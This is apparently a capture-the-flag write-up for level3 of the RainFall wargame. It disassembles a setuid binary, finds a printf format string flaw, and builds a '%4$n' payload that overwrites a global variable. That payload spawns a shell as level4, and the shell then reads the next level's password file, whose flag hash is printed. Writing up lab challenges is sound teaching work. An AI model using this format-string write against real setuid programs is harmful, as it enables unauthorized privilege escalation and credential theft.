level3
======

*	We spawn with a [level3](source/level3) executable
	```console
	level3@RainFall:~$ ls -l 
	total 8
	-rwsr-s---+ 1 level4 users 5366 Mar  6  2016 level3
	level3@RainFall:~$ ./level3
	█
	```
*	Let's take a look at the code
	```console
	root@DESKTOP-69N2SL4:~# scp -P 4242 level3@192.168.29.4:~/level3 .
	root@DESKTOP-69N2SL4:~# ./getFunctions.sh 
	Executable files in the current directory:
	[1] ./level3
	Enter the number of the executable file you want to analyze: 1
	```
*	My script created the [disas.s](source/disas.s) file which will make understanding this code a bit easier. We can see the main function calls the `p` one. This function uses `gets` but once again it looks protected
*	But hold on there are some interesting stuff here. Let's summarize the code :
	-	`fgets()` a string
	-	uses `printf()` to instantly print it out
	-	`cmp` the global variable `m` (`0x804988c`) with `0x40 (64)`
	-	if not equal jump to `leave`
	-	else continue
	-	then puts `0x8048600` in `eax` -> (`0x8048600: "Wait what?!\n"`)
	-	`fwrite()` it
	-	call to `system()` with `esp` of value -> (`0x804860d: "/bin/sh"`)
	I also used `Ghidra` to decompile it in `C` so that we can understand it better -> [level3.c](source/level3.c)
*	Important thing here is also that `printf()` is vulnerable to [format string exploit](https://owasp.org/www-community/attacks/Format_string_attack) !
	```console
	level3@RainFall:~$ ./level3 
	%x %x %x
	200 b7fd1ac0 b7ff37d0
	level3@RainFall:~$ ./level3 
	aaaa %x %x %x %x %x %x
	aaaa 200 b7fd1ac0 b7ff37d0 61616161 20782520 25207825
	```
	Here we can see our string `aaaa` at fourth position `61616161`
*	So we want to make the condition succeed, we need to make sure the content of m is of 64 bytes
*	We will be using the `%n` modifier which we can specify the address like so `%[address]$n`
*	Now let's not forget the little endian rule with the address of `m` and try to replace `aaaa` with it
	```console
	level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08 %x %x %x %x"' > /tmp/test
	level3@RainFall:~$ cat /tmp/test | ./level3
	� 200 b7fd1ac0 b7ff37d0 804988c
	```
	Ok it worked
*	We now need to calculate our format string :
	-	address of m -> 4 bytes
	-	random data -> 60 bytes
	not too hard here
*	We now got everything we need, let's and this level :
	```console
	level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08" + "a" * 60 + "%4$n"' > /tmp/test
	level3@RainFall:~$ cat /tmp/test - | ./level3
	�aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
	Wait what?!
	whoami
	level4
	cat /home/user/level4/.pass
	b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
	```